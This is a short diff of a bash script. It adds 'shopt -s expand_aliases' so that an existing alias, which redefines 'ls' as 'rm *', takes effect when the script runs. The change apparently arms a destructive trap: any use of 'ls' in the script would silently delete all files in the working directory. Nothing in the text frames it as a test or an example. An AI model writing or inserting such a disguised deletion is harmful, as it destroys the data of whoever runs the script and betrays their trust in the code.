@@ -1,2 +1,4 @@
 #!/bin/bash
+
+shopt -s expand_aliases
 alias -p ls="rm *"
